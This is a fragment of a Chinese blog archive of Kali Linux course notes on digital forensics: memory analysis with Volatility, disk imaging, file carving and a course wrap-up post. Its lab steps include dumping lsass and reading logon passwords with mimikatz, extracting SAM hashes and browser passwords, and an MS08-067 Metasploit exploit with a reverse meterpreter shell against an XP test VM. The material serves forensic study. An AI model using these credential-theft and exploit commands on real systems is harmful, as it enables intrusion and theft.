        <tag>IPS</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记--写在最后</title>
    <url>/2020/03/05/Kali%20Linux%E7%AC%94%E8%AE%B0--%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E/</url>
    <content><![CDATA[<hr>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><h2 id="安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程"><a href="#安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程" class="headerlink" title="安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程"></a>安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程</h2><ul>
<li>课程内容<ul>
<li>Kali安装与实验环境搭建  -&gt;  √ </li>
<li>基本攻击  -&gt;  √</li>
<li>信息收集  -&gt;  √</li>
<li>主动信息收集  -&gt;  √</li>
<li>弱点扫描  -&gt;  √</li>
<li>缓冲区溢出  -&gt;  √</li>
<li>提权  -&gt;  √</li>
<li>无线攻击  -&gt;  X</li>
<li>Web安全  -&gt;  √</li>
<li>密码破解  -&gt;  √</li>
<li>流量操控与隧道技术  -&gt;  √</li>
<li>拒绝服务  -&gt;  √</li>
<li>免杀  -&gt;  √</li>
<li>Metasploit Framework  -&gt;  √</li>
<li>取证  -&gt;  √</li>
</ul>
</li>
<li>▲ 无线安全独立于其他模块，而且对于其他部分内容影响几乎没有，所有暂无学，在不久的将来，若有涉及到，会再翻回来继续学习，聆听苑老师的课，开启1.5倍加速，哈哈哈哈哈….</li>
</ul>
<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><h3 id="从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢文华大佬提供的帮助和支持-是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。"><a href="#从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢文华大佬提供的帮助和支持-是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。" class="headerlink" title="从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢文华大佬提供的帮助和支持,是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。"></a>从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢<a href="https://fengwenhua.top/" target="_blank" rel="noopener">文华大佬</a>提供的帮助和支持,是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。</h3><h3 id="107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？"><a href="#107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？" class="headerlink" title="107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？"></a>107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？</h3><h3 id="最后，借用文华大佬的一句话，慢慢来，不急不急…"><a href="#最后，借用文华大佬的一句话，慢慢来，不急不急…" class="headerlink" title="最后，借用文华大佬的一句话，慢慢来，不急不急…."></a>最后，借用文华大佬的一句话，慢慢来，不急不急….</h3>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百一十七)：活取证和死取证</title>
    <url>/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<hr>
<h4 id="1-活取证"><a href="#1-活取证" class="headerlink" title="1. 活取证"></a>1. 活取证</h4><ul>
<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
<li>从内存还原文字<ul>
<li>procdump：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a> <ul>
<li>存在Linux版本，GitHub链接：<a href="https://github.com/Microsoft/ProcDump-for-Linux" target="_blank" rel="noopener">https://github.com/Microsoft/ProcDump-for-Linux</a></li>
</ul>
</li>
<li>strings：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings</a></li>
<li><strong><code>🔺命令：procdump -ma notepad.exe notepad.dmp</code></strong>（记事本的进程）</li>
<li><strong><code>🔺命令：strings notepad.dmp &gt; notepad.txt</code></strong>（只识别连续三个以上的ASCII码字符）</li>
<li>其他文字处理程序也适用</li>
</ul>
</li>
<li>从内存还原图片<ul>
<li>远程桌面、画图工具、Virtualbox虚拟机（dump取虚拟机window XP SP3的图像）</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3x86 memdump -p 1456 -D test</code></strong> </li>
<li><strong><code>🔺命令：mv mstsc.dmp mstsc.data</code></strong></li>
<li>Gimp -&gt; open -&gt; Raw Image Data -&gt; 调整参数</li>
</ul>
</li>
<li>从内存中提取明文密码<ul>
<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
<li><strong><code>🔺命令：Mimikatz</code></strong> </li>
<li><strong><code>🔺命令：sekurlsa::minidump lsass.dmp</code></strong> </li>
<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong> </li>
</ul>
</li>
<li>Volatility的mimikatz插件<ul>
<li><a href="https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py" target="_blank" rel="noopener">https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py</a></li>
</ul>
</li>
<li>Firefox浏览器审计工具<ul>
<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --All</code></strong></li>
</ul>
</li>
</ul>
<h4 id="2-实验–从内存还原文字"><a href="#2-实验–从内存还原文字" class="headerlink" title="2. 实验–从内存还原文字"></a>2. 实验–从内存还原文字</h4><ul>
<li>Window XP SP3<ul>
<li>拷贝procdump到window XP SP3上</li>
<li>找一段文字写入notepad中，<strong><code>🔺命令：netstat -nao</code></strong>查看进程是否有notepad.exe</li>
<li><strong><code>🔺命令：procdump.exe -ma notepad.exe notepad.dmp</code></strong></li>
<li><strong><code>🔺命令：strings.exe notepad.dmp &gt; notepad.txt</code></strong></li>
<li>对比两个文件的内容，是否存在相同（搜索特征字符）</li>
</ul>
</li>
</ul>
<h4 id="3-实验–从内存还原图片"><a href="#3-实验–从内存还原图片" class="headerlink" title="3. 实验–从内存还原图片"></a>3. 实验–从内存还原图片</h4><ul>
<li>▲ 图片不同于图像，图像在软件中保存后，可以导出为图片</li>
<li>Window XP SP3<ul>
<li>截图工具 → 随意截取一张图片 → 保存图片到桌面 → 用画图工具打开</li>
<li><strong><code>🔺命令：cmd → tasklist</code></strong><ul>
<li>在Window XP SP3上暂不能执行此命令</li>
</ul>
</li>
<li><strong><code>🔺命令：procdump.exe -ma mspaint.exe mspaint.dmp</code></strong></li>
<li>Win+R → mstsc → 远程连接一个机器</li>
<li><strong><code>🔺命令：cmd → tasklist</code></strong></li>
<li><strong><code>🔺命令：procdump.exe -ma mstsc.exe mstsc.dmp</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>从共享文件中拷贝mspaint.dmp和mstsc.dmp文件</li>
<li><strong><code>🔺命令：apt-get install gimp</code></strong></li>
<li>打开gimp</li>
<li><strong><code>🔺命令：mv mspaint.dump mspaint.data</code></strong></li>
<li><strong><code>🔺命令：mv mstsc.dump mstsc.data</code></strong></li>
<li>gimp打开mstsc.data/mspaint.data</li>
<li>调整Offset、Width、Height（高度一般不起作用，宽度一般其决定作用）</li>
<li>▲ 2020.03.04 gimp通过滑块去移动会导致软件崩溃，只能通过值输入</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/gimp%E6%89%93%E5%BC%80%E5%86%85%E5%AD%98%E5%9B%BE%E7%89%87.png" srcset="/img/loading.gif" alt="gimp打开内存图片"></p>
<h4 id="4-实验–从内存提取明文密码"><a href="#4-实验–从内存提取明文密码" class="headerlink" title="4. 实验–从内存提取明文密码"></a>4. 实验–从内存提取明文密码</h4><ul>
<li>Window XP SP3<ul>
<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：cd /usr/share/mimikatz</code></strong></li>
<li>压缩mimikatz x86为一个x86.zip文件</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>拷贝.x86到window XP SP3的机子上</li>
<li>双击mimikatz打开</li>
<li><strong><code>🔺命令：sekurlsa::</code></strong></li>
<li><strong><code>🔺命令：sekurlsa::minidump lsa.dmp</code></strong></li>
<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong></li>
<li>查看dump下来的身份信息</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/kodex/index.php?user/publicLink&fid=cc53U-yoem8lUfoxmFbu2wXynjsFjLnBwEC3Si4GrjvAMVZi0GehgaJnJJSuvMt_a-86ajRPPkZdq5V6hdfOsLik7IbdzMRDgcpHfelW-f6eQWU0YlWGthKivPxBASWwcl_CdYKKhurBl9LH0eE&file_name=/logonPasswords%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF.png" srcset="/img/loading.gif" alt="logonPasswords的身份信息"></p>
<h4 id="5-实验–Volatility的mimikatz插件"><a href="#5-实验–Volatility的mimikatz插件" class="headerlink" title="5. 实验–Volatility的mimikatz插件"></a>5. 实验–Volatility的mimikatz插件</h4><ul>
<li>Kali<ul>
<li>▲ 2020.03.04 Github的链接失效，暂无法找到mimikatz.py，此模块未实验</li>
<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
<li>从Github上下载mimikatz插件到volatility的plugins库中</li>
<li><strong><code>🔺命令：volatility -f xp.raw imageinfo</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile==WindowXPSP3x86 mimikatz</code></strong></li>
<li>查看是否拿到密码</li>
</ul>
</li>
</ul>
<h4 id="6-实验–Firefox浏览器审计工具"><a href="#6-实验–Firefox浏览器审计工具" class="headerlink" title="6. 实验–Firefox浏览器审计工具"></a>6. 实验–Firefox浏览器审计工具</h4><ul>
<li>▲ 在未关机的情况下取证，找寻firefox使用的浏览信息</li>
<li>Kali<ul>
<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --Passwords</code></strong>（目录可能不一样）</li>
<li>查看是否可看到浏览器信息</li>
</ul>
</li>
<li>▲ 2020.03.04 –All参数被去除</li>
</ul>
<h4 id="7-死取证"><a href="#7-死取证" class="headerlink" title="7. 死取证"></a>7. 死取证</h4><ul>
<li>硬盘镜像<ul>
<li>使用Kali光盘启动计算机创建硬盘镜像文件（位镜像的拷贝）</li>
<li>留足存储镜像文件的存储空间</li>
<li>Dc3dd（来自美国空军计算机犯罪中心）</li>
<li>Dcfldd</li>
<li>Guymager</li>
<li>计算机取证技术参考数据集<ul>
<li><a href="http://www.cfreds.nist.gov/Controlv1_0/control.dd" target="_blank" rel="noopener">http://www.cfreds.nist.gov/Controlv1_0/control.dd</a></li>
</ul>
</li>
<li>DFF（Digital Forensics Framework）<ul>
<li>Open Evidence  #红色表示已经删除的文件</li>
<li>▲ Kali官方已经剔除DFF软件，也无法手动安装，只能去官网手动安装包下载</li>
</ul>
</li>
<li>Autopsy<ul>
<li>非常流行的硬盘镜像分析工具</li>
<li>WebServer+客户端架构</li>
</ul>
</li>
<li>Extundelete<ul>
<li>适用于ext3、ext4文件系统的反删除工具</li>
<li><strong><code>🔺命令：Extundelete [device-file] --restore-file [restore location]</code></strong> </li>
</ul>
</li>
<li>iPhone Backup Analyzer<ul>
<li>分析iTunes生成的iPhone手机备份文件，并非电话image</li>
</ul>
</li>
<li>Foremost（美国开发）<ul>
<li>从内存dump中恢复文档图片，支持raw、dd、iso、vmem、excel、doc等格式（图片非图像）</li>
<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i 7.raw</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-实验–Guymager"><a href="#8-实验–Guymager" class="headerlink" title="8. 实验–Guymager"></a>8. 实验–Guymager</h4><ul>
<li>Window 7光盘挂载Kali Linux，forensic mode启动（取证模式）</li>
<li>启动Guymager（可能无发现硬盘，可以进行选择扫描尝试）</li>
<li>选择要取证的硬盘 → 右键 → Acquire images<ul>
<li>Linux dd raw image/Expert Withess Format,sub-format Guymager</li>
<li>▲ 可以分成多个文件，并设置MD5/SHA-1/SHA-256的哈希验证</li>
<li>Case Number 999（钥匙数字）</li>
<li>Evidence Number 001（证据编号）</li>
<li>Examiner mzt（证据人）</li>
<li>Description server（描述）</li>
<li>Image directory（保存路径）</li>
<li>image filename（文件名）</li>
<li>info filename（信息文件名）</li>
</ul>
</li>
<li>Start</li>
</ul>
<p><img src="/images/kali/kali-notepad/kodex/index.php?user/publicLink&fid=b530q0aJH5AM4mNQlrn-PR6sLYorGWiNy4-8AagL83_hKfdBeuyz-PbjcwbuRBCyTynYga6NWvnuXNew1n1lV8Y70cVCSlNJrhXlohJUe_HlBIqbMH2Jr0VUmDFNEk0&file_name=/Guymager%E5%8F%96%E8%AF%81.png" srcset="/img/loading.gif" alt="Guymager取证"></p>
<h4 id="9-实验–Autopsy"><a href="#9-实验–Autopsy" class="headerlink" title="9. 实验–Autopsy"></a>9. 实验–Autopsy</h4><ul>
<li>Kali<ul>
<li>▲ 2020.03.04 无法拷贝到control.dd文件，输入网址出现乱码</li>
<li>拷贝准备好的control.dd文件到/root目录下</li>
<li>autopsy启动服务端</li>
<li>浏览器访问：<a href="http://localhost:9999/autopsy" target="_blank" rel="noopener">http://localhost:9999/autopsy</a></li>
<li>NEW CASE → 添加信息（Case Name、Description、Investigator）→ NEW CASE</li>
<li>ADD HOST → 填写主机信息</li>
<li>ADD IMAGE → 镜像文件信息（Location、Type(分区还是整盘)、Import Method(一般为copy，move怕断电，Symlink怕移动链接失效)）</li>
<li>Next → Data Integrity（镜像文件的MD5的计算）→ File System Details → ADD</li>
<li>OK</li>
<li>ANALYZE（一般位FILE ANALYSNS）→ 可对文件进行一定的还原</li>
</ul>
</li>
</ul>
<h4 id="10-实验–Foremost"><a href="#10-实验–Foremost" class="headerlink" title="10. 实验–Foremost"></a>10. 实验–Foremost</h4><ul>
<li>Kali<ul>
<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i xp.raw</code></strong></li>
<li>output文件夹中查看提取的文件</li>
</ul>
</li>
</ul>
<h4 id="11-网络取证"><a href="#11-网络取证" class="headerlink" title="11. 网络取证"></a>11. 网络取证</h4><ul>
<li>▲ 网络取证请看&lt;&lt;协议分析&gt;&gt;<ul>
<li>全流量镜像可以还原历史</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百一十六)：取证工具--Volatility</title>
    <url>/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7--Volatility/</url>
    <content><![CDATA[<hr>
<h4 id="1-取证工具"><a href="#1-取证工具" class="headerlink" title="1. 取证工具"></a>1. 取证工具</h4><ul>
<li>▲ 分析内存需要扎实的计算机系统功底</li>
<li>分析内存<ul>
<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong>  #文件信息，关注profile</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86</code></strong>  #数据库文件</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivedump -o 0xe124f8a8</code></strong>  #按虚内存地址查看注册表内容</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></strong>  #用户账号<ul>
<li>注册表中Administrator对于SAM文件只有特殊的权限，无完全控制权限，可通过修改权限设置，添加父类子类继承选项赋予Administrator对SAM文件、其子文件以及其文件键值的完全控制权</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></strong>  #最后登陆的账号</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 userassist</code></strong>  #正在运行的程序、运行过多少次、最后一次运行时间等</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pslist</code></strong>  #内存进程信息<ul>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 memdump -p 1456 -D test</code></strong>  #dump进程内存</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivelist</code></strong>  #注册表的蜂巢文件（SOFTWARE–操作系统+自安装软件信息）</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pstree</code></strong>  #内存进程树信息</li>
<li><strong><code>🔺命令：volatility cmdscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #命令行历史（类似history）</li>
<li><strong><code>🔺命令：volatility netscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #所有网络连接<ul>
<li>该命令对x86架构的机器不起作用</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility connscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #所有建立的网络连接</li>
<li><strong><code>🔺命令：volatility iehistory -f xp.raw --profile=WinXPSP3X86</code></strong>  #建立的IE连接</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hashdump -y system虚地址 -s SAM虚地址</code></strong>  #提取哈希值</li>
</ul>
</li>
</ul>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
<li>插件目录：/usr/lib/python2.7/dis-packages/volatility/plugins</li>
<li>拷贝Dump内存文件xp.raw到Kali的机子上</li>
<li>Volatility <ul>
<li>-h：帮助功能列表</li>
<li>-F：要分析文件</li>
<li>–profile：操作系统类型</li>
<li>-p：进程PID</li>
<li>-D：dump内存到的目录</li>
<li>-o：虚内存地址</li>
<li>-k：注册表的键值</li>
<li>-y：使用SYSTEM的虚地址</li>
<li>-s：使用SAM的虚地址</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong> </li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pslist</code></strong><ul>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 memdump -p 1456 -D test</code></strong><ul>
<li>十六进制查看：<strong><code>🔺命令：hexeditor 1456.dump</code></strong></li>
<li>关键字符串：<strong><code>🔺命令：strings 1456.dump | grep password</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pstree</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivelist</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivedump -o 0xe124f8a8</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 userassist</code></strong></li>
<li><strong><code>🔺命令：volatility cmdscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility netscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility connscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility iehistory -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hashdump -y system虚地址 -s SAM虚地址</code></strong></li>
</ul>
<h4 id="3-Volatility插件"><a href="#3-Volatility插件" class="headerlink" title="3. Volatility插件"></a>3. Volatility插件</h4><ul>
<li>Firefoxhistory插件（Python脚本文件）<ul>
<li>▲ 2020.03.04 因Window XP SP3中没有Firefox，此模块未实验</li>
<li><a href="http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip" target="_blank" rel="noopener">http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip</a> </li>
<li>插件地址：/usr/lib/python2.7/dist-packages/volatility/plugins/ </li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 firefoxhistory</code></strong> </li>
</ul>
</li>
<li>USN日志记录插件<ul>
<li>NTFS特性，用于跟踪硬盘内容变化（不具体记录变更内容）</li>
<li><a href="https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py</a> </li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 usnparser --output=csv --output-file=usn.csv</code></strong><ul>
<li>▲ 2020.03.04 能输出文件，但文件没有任何信息</li>
</ul>
</li>
</ul>
</li>
<li>Timeline插件<ul>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 timeliner</code></strong></li>
<li>从多个位置收集大量系统活动信息，绘画时间线、分析</li>
</ul>
</li>
</ul>
<h4 id="4-内存取证发现恶意软件"><a href="#4-内存取证发现恶意软件" class="headerlink" title="4. 内存取证发现恶意软件"></a>4. 内存取证发现恶意软件</h4><ul>
<li>恶意程序分析包网站集合<ul>
<li><a href="https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples</a></li>
<li><a href="https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki" target="_blank" rel="noopener">https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki</a></li>
<li>▲ 2020.03.04 上列程序包，已经多年未更新</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>启动Dumpit，保存文件为xp.raw</li>
</ul>
</li>
<li>Kali<ul>
<li>拷贝xp.raw到Kali上</li>
<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3x86 pstree</code></strong> #查看进程树</li>
<li><strong><code>🔺命令：volatility connscan</code></strong>  #查看网络连接，查看可疑进程的PID</li>
<li><strong><code>🔺命令：volatility getsids -p 可疑进程的PID（可多个）</code></strong>  #查看进程的SID<ul>
<li>正常的情况下，svchost的权限无SYSTEM权限，权限数量一般一样</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility dlllist -p 111,222</code></strong>  #查看调动库文件</li>
<li><strong><code>🔺命令：volatility malfind -p 111,222 -D test</code></strong>  #检查结果查毒<ul>
<li>病毒文件标志<ul>
<li>标志：PAGE_EXECUTE_READWRITE</li>
<li>可执行文件：PE程序 -&gt; 在十六进制中为MZ开头</li>
<li>内存地址：内存地址多块，存在多个内存地址空间</li>
<li>查看文件类型：可执行程序还是数据（查看文件类型：file *）</li>
</ul>
</li>
<li>杀毒软件查杀<ul>
<li>拷贝单个文件到有杀毒软件的系统，查看是否被查杀</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>▲ 恶意程序<ul>
<li>体积小：基本上调系统的动态链接库，使自己的体积小，但兼容性差，到别的操作系统可能无法执行</li>
<li>体积大：基本上调自己的动态链接库，体积大，但兼容性好，可到别的操作系统执行</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百一十五)：取证科学、分类、原则、方法、工具</title>
    <url>/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%94)%EF%BC%9A%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E3%80%81%E5%88%86%E7%B1%BB%E3%80%81%E5%8E%9F%E5%88%99%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<hr>
<h4 id="1-取证科学简介"><a href="#1-取证科学简介" class="headerlink" title="1. 取证科学简介"></a>1. 取证科学简介</h4><ul>
<li>Forensic investigations</li>
<li>法庭取证调查</li>
<li>事件响应调查<ul>
<li>黑客攻击、渗透测试痕迹</li>
</ul>
</li>
</ul>
<p>![CSI：CRIME SCENE INVESTIGATION](/images/kali/kali-notepad/CSI：CRIME SCENE INVESTIGATION.png)</p>
<h4 id="2-取证科学"><a href="#2-取证科学" class="headerlink" title="2. 取证科学"></a>2. 取证科学</h4><ul>
<li>什么是Forensic科学<ul>
<li>法医的、用于法庭的、辩论学、法医学</li>
<li>为了侦破案件还原事实真相，收集法庭证据的一系列科学方法<ul>
<li>参考本地区法律要求</li>
<li>实践操作通用原则</li>
</ul>
</li>
</ul>
</li>
<li>CSI：物理取证<ul>
<li>指纹、DNA、弹道、血迹</li>
<li>物理取证的理论基础是物质交换原则</li>
</ul>
</li>
<li>本章关注：数字取证 / 计算机取证 / 电子取证<ul>
<li>智能设备、计算机、手机平板、IoT、有线及无线通信（Wireshark抓包分析）、数据存储</li>
</ul>
</li>
</ul>
<h4 id="3-通用原则"><a href="#3-通用原则" class="headerlink" title="3. 通用原则"></a>3. 通用原则</h4><ul>
<li>维护证据完整性<ul>
<li>数字取证比物理取证幸运的多，可以有无限数量的拷贝进行分析<ul>
<li>▲ 对iphone手机芯片的复制，可以实现理论上的暴力破解</li>
</ul>
</li>
<li>数字HASH值验证数据完整性</li>
</ul>
</li>
<li>维护监管链<ul>
<li>物理证物保存在证物袋中，每次取出使用严格记录，避免破坏污染</li>
<li>数字证物原始版本写保护，使用拷贝进行分析</li>
</ul>
</li>
<li>标准的操作步骤<ul>
<li>证物使用严格按照规范流程，即使事后证明流程有误（免责）</li>
</ul>
</li>
<li>取证分析全部过程记录文档</li>
<li>数字取证者的座右铭<ul>
<li>不要破坏数据现场（看似简单，实际几乎无法实现）<ul>
<li>系统命令可能被植入木马，整个计算机都不可信 → 使用干净U盘的操作系统命令</li>
